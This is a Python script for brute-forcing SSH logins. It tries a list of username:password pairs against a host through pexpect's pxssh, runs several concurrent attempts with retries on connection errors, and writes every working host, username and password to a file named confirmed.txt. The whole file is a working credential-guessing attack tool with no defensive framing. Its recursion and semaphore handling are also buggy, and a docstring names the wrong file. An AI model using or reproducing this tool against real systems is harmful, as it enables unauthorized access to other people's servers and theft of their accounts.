#!/usr/bin/env python3
from pexpect import pxssh
from threading import *
import os
from time import sleep
from tqdm import tqdm


max_con = 5
con_lock = Semaphore(value=max_con)

confirmed_credentials = False
failed_connections = 0


def login_ssh(host, cred):
    global confirmed_credentials
    global failed_connections
    con_lock.acquire()

    pbar = tqdm(cred, ncols=75)
    for i in pbar:
        un = i.split(":")[0]
        pw = i.split(":")[1]
        pbar.set_description("{:<30}".format(i))
        try:
            s = pxssh.pxssh()
            if s.login(host, un, pw, sync_original_prompt=False):
                confirmed_credentials = True
                s.close()
                try:
                    path = "./confirmed.txt"
                    mode = "a+" if os.path.exists(path) else os.mknod(path)
                    with open(path, "r+") as r:
                        """
                        Opens or creates the hosts.txt file in read mode, checks the addresses (if any).
                        Changes the value of append to False if address is found.
                        Appends the address to hosts.txt if append still True after file is read.
                        """
                        append = True
                        for item in r.readlines():
                            if "{}:{}:{}".format(host, un, pw) in item:
                                append = False
                        if append:
                            with open("confirmed.txt", "a+") as w:
                                w.seek(0)
                                w.write("{}:{}:{}".format(host, un, pw))
                                w.write("\n")
                    pbar.set_description("CREDENTIALS FOUND - THREAD FINISHED")
                    return True
                except Exception as e:
                    print(e)
        except Exception as e:
            if "read_nonblocking" in str(e):
                failed_connections += 1
                sleep(0.5)
                login_ssh(host, cred)
            if "synchronize with original prompt" in str(e):
                sleep(0.1)
                login_ssh(host, cred)
        finally:
            if confirmed_credentials:
                con_lock.release()
